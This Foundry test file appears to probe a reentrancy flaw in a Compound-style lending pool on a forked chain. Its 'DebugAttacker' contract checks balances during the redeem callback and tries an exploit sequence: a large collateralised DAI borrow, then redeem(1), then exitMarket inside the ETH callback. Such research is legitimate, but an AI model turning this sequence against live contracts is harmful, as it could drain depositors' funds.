// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICEther {
    function mint() external payable;
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function accrueInterest() external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
}

interface ICErc20 {
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function underlying() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

/// @dev Test to verify cToken balance DURING callback
contract DebugAttacker {
    address constant COMPTROLLER = 0x814b02C1ebc9164972D888495927fe1697F0Fb4c;
    address constant F6_ETH = 0xF6551C22276b9Bf62FaD09f6bD6Cad0264b89789;
    address constant F_DAI_6 = 0x989273ec41274C4227bCB878C2c26fdd3afbE70d;

    address payable public immutable owner;
    bool public inRedeem;
    uint256 public cBalBeforeRedeem;
    uint256 public cBalDuringCallback;
    uint256 public cBalAfterRedeem;

    constructor() { owner = payable(msg.sender); }

    function testCEIOrder() external payable {
        // Mint
        ICEther(F6_ETH).mint{value: msg.value}();
        cBalBeforeRedeem = ICEther(F6_ETH).balanceOf(address(this));
        console.log("cTokens before redeem:", cBalBeforeRedeem);

        // Redeem 1 cToken - check balance during callback
        inRedeem = true;
        ICEther(F6_ETH).redeem(1);
        inRedeem = false;

        cBalAfterRedeem = ICEther(F6_ETH).balanceOf(address(this));
        console.log("cTokens during callback:", cBalDuringCallback);
        console.log("cTokens after redeem:", cBalAfterRedeem);

        if (cBalDuringCallback == cBalBeforeRedeem) {
            console.log(">>> CEI VIOLATION: balance NOT decremented during callback!");
        } else if (cBalDuringCallback == cBalBeforeRedeem - 1) {
            console.log(">>> CEI correct: balance was decremented before callback");
        }

        // Return funds
        if (cBalAfterRedeem > 0) {
            ICEther(F6_ETH).redeem(cBalAfterRedeem);
        }
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    /// @dev Full exploit test: mint, borrow, redeem(1), exitMarket in callback, redeem all
    function testFullExploit() external payable {
        console.log("=== Full Exploit Attempt ===");
        console.log("ETH supplied:", msg.value / 1e18);

        // Mint fETH-6
        ICEther(F6_ETH).mint{value: msg.value}();
        uint256 cBal = ICEther(F6_ETH).balanceOf(address(this));
        console.log("cTokens minted:", cBal);

        // Enter market
        address[] memory m = new address[](1);
        m[0] = F6_ETH;
        IComptroller(COMPTROLLER).enterMarkets(m);

        // Borrow DAI
        uint256 cash = ICErc20(F_DAI_6).getCash();
        uint256 amt = cash > 1_800_000 ether ? 1_800_000 ether : cash;
        uint256 r = ICErc20(F_DAI_6).borrow(amt);
        require(r == 0, "borrow failed");

        address dai = ICErc20(F_DAI_6).underlying();
        console.log("DAI borrowed:", IERC20(dai).balanceOf(address(this)) / 1e18);

        (uint256 e1, uint256 l1, uint256 s1) = IComptroller(COMPTROLLER).getAccountLiquidity(address(this));
        console.log("Pre-redeem liquidity:", l1 / 1e18);
        console.log("Pre-redeem shortfall:", s1 / 1e18);

        // Now the key: redeem(1) to trigger callback
        inRedeem = true;
        cBalBeforeRedeem = ICEther(F6_ETH).balanceOf(address(this));
        ICEther(F6_ETH).redeem(1);
        inRedeem = false;

        console.log("cBal during callback:", cBalDuringCallback);
        console.log("cBal before redeem:", cBalBeforeRedeem);

        // Return funds
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!inRedeem || msg.sender != F6_ETH) return;
        inRedeem = false; // prevent re-entry

        cBalDuringCallback = ICEther(F6_ETH).balanceOf(address(this));
        console.log("  [callback] cBal:", cBalDuringCallback);
        console.log("  [callback] ETH received:", msg.value);

        // Try exitMarket
        uint256 code = IComptroller(COMPTROLLER).exitMarket(F6_ETH);
        console.log("  [callback] exitMarket:", code);
    }
}

contract Pool6Debug is Test {
    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH3_FEIRARI"));
    }

    function test_cei_order() public {
        vm.deal(address(this), 100 ether);
        DebugAttacker a = new DebugAttacker();
        a.testCEIOrder{value: 10 ether}();
    }

    function test_full_exploit() public {
        vm.deal(address(this), 2000 ether);
        DebugAttacker a = new DebugAttacker();
        a.testFullExploit{value: 1000 ether}();
    }

    receive() external payable {}
}
